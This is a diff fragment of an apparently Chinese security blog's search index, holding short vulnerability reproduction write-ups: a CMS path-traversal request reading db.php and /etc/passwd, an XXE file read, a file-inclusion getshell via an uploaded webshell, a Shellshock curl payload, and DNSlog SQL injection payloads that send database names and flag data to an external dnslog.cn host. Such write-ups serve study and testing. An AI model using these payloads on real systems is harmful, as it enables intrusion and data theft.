keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept:</span> */*<span class="token header-name keyword">Connection:</span> keep-alive<span class="token header-name keyword">Cookie:</span> members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=xcxmiku; members_uc_info[uid]=123456; members_uc_info[username]=xcxmiku<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencodedajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会返回如下数据</p><p><img src="https://i.loli.net/2019/10/21/NPhFWOcK6wd3TQA.png"></p><p> 在/data/upload/avatar/年月/日文件夹下 会生成一张图片</p><p><img src="https://i.loli.net/2019/10/21/NitTmDKRWvFMUJ6.png"></p><p>这张图片的名称由id和时间戳的md5值构成，我们可以将Burp Suite上返回的时间转换为时间戳</p><p><img src="https://i.loli.net/2019/10/21/aBcimVp8erndODU.png"></p><p>不过这个时间可能会有误差，如果不行就把时间+-10</p><p>我post的id为654321，获取的时间戳为1571659588，将他们连在一起进行md5加密</p><p><img src="https://i.loli.net/2019/10/21/WuoP3xDBIOgrHQE.png"></p><p>成功获取图片名，然后访问 10.1.1.1/data/upload/avatar/1910/21/9aaa3653bf6ec9491bc002b52521962c.jpg ，保存该图片用文本打开就是 db.php 的内容。</p><h6 id="PS"><a href="#PS" class="headerlink" title="PS:"></a>PS:</h6><p>在没有Burp Suite的情况下可以直接使用<a href="http://coolaf.com/">在线POST</a>，参数如下</p><p><img src="https://i.loli.net/2019/10/22/rQOT4Nw5ZIgC3o2.png"></p><p>在Header可获取到时间戳</p><p><img src="https://i.loli.net/2019/10/22/Htl8Le2sYUIT9Nx.png"></p><h2 id="可能会遇到的问题"><a href="#可能会遇到的问题" class="headerlink" title="可能会遇到的问题"></a>可能会遇到的问题</h2><h6 id="post数据返回unicode编码"><a href="#post数据返回unicode编码" class="headerlink" title="post数据返回unicode编码"></a>post数据返回unicode编码</h6><p>因为名称，密码，ID等内容格式不对或重复会出现这种情况，将unicode编码进行解码，按提示修改即可。</p><h6 id="读取其他文件"><a href="#读取其他文件" class="headerlink" title="读取其他文件"></a>读取其他文件</h6><p>../../../../Application/Common/Conf/db.php</p><p>是读取db.php，如果想读取根目录可以构造</p><p>../../../../../../../../etc/passwd</p><h6 id="时间戳问题"><a href="#时间戳问题" class="headerlink" title="时间戳问题"></a>时间戳问题</h6><p>服务器返回的时间，服务器返回的是GMT格林威治标准时间，没有加上时区，只记录分秒即可</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CMS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>简单的PHP反序列化</title>
       <link href="/archives/f8e3d21b/"/>
       <url>/archives/f8e3d21b/</url>
@@ -156,6 +333,56 @@
     
     
     <entry>
+      <title>XML外部实体注入(XXE)</title>
+      <link href="/archives/81510889/"/>
+      <url>/archives/81510889/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.</p><p>在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果构造特殊的实体就可以做到任意文件读取。</p><p>想了解XXE可以去看先知社区的这篇文章<a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a>。</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>抓包某登录框，发现是使用XML传输切会回显登录用户名</p><p><img src="https://i.loli.net/2019/10/28/XuiFc5BDROknwpe.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>构建外部实体读取etc/passwd成功</p><p><img src="https://i.loli.net/2019/10/28/6bYKjNZfDOJ4L5P.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> XXE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>凡诺CMS文件包含漏洞</title>
+      <link href="/archives/b0c3a4a4/"/>
+      <url>/archives/b0c3a4a4/</url>
+      
+        <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/10/28/BZEiyAfn6vCF8OD.png" alt="文件包含8.png"></p><p>在后台添加频道处可以上传图片和附件，可以上传图片或上传以下格式的附件</p><p><img src="https://i.loli.net/2019/10/28/N2Vy1WZzpvDERY7.png"></p><p>图片马的制作在上篇<a href="https://xcxmiku.github.io/2019/10/15/LFI%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文章</a>说过，这里我将冰蝎马改名为shell.doc进行上传，上传后会回显文件地址。</p><p><img src="https://i.loli.net/2019/10/28/jDT5OdbHMoIPure.png"></p><p>然后将回显的文件地址填在频道模板处，在地址前面加上../../（用于跳出文件目录）</p><p><img src="https://i.loli.net/2019/10/28/BlRUQC8MEidTwaJ.png"></p><p>设置频道名称后添加频道，在首页找到添加的频道打开</p><p><img src="https://i.loli.net/2019/10/28/R4uBDmyFlXGCVns.png"></p><p>页面并没有显示任何东西，因为被当成PHP解析了。</p><p>使用冰蝎连接即可getshell！</p><p><img src="https://i.loli.net/2019/10/28/fqK3x4MarVvlo6Z.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 文件包含 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>LFI本地文件包含</title>
       <link href="/archives/2eda3969/"/>
       <url>/archives/2eda3969/</url>
@@ -173,6 +400,56 @@
         <tags>
             
             <tag> 文件包含 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>破壳漏洞（CVE-2014-6271）</title>
+      <link href="/archives/7dc46b66/"/>
+      <url>/archives/7dc46b66/</url>
+      
+        <content type="html"><![CDATA[<p>linux下可以直接使用curl进行复现，命令如下 </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> -A <span class="token string">' () &#123; :;&#125;;echo ;  echo $(/bin/ls /);'</span> <span class="token string">'http://www.*****.com/cgi-bin/poc.cgi'</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/cJipDq98KvAQ7LP.png"></p><p>Windows下可使用Burp Suite</p><p>将User-Agent改为() { :;};echo ;  echo $(/bin/ls /);</p><p><img src="https://i.loli.net/2019/10/28/4y8TzkoZWEH3Pe6.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>记一次dnslog注入</title>
+      <link href="/archives/9437e8fc/"/>
+      <url>/archives/9437e8fc/</url>
+      
+        <content type="html"><![CDATA[<p>DNSlog辅助平台</p><p><a href="http://ceye.io/">http://ceye.io</a> 需注册</p><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a> 无需注册</p><h4 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h4><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www&#x2F;index.php?id&#x3D;1 and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.aksgyv.dnslog.cn\\abc&#39;))),0,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h4><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www&#x2F;index.php?id&#x3D;1 and if((select load_file(concat(&#39;\\\\&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;dnslog&#39;),&#39;.aksgyv.dnslog.cn\\abc&#39;))),0,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h4><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www&#x2F;index.php?id&#x3D;1 and if((select load_file(concat(&#39;\\\\&#39;,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;flag_is_here&#39;),&#39;.aksgyv.dnslog.cn\\abc&#39;))),0,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h4><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.&#x2F;index.php?id&#x3D;1 and if((select load_file(concat(&#39;\\\\&#39;,(select flag from flag_is_here),&#39;.aksgyv.dnslog.cn\\abc&#39;))),0,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql注入 </tag>
             
         </tags>
       
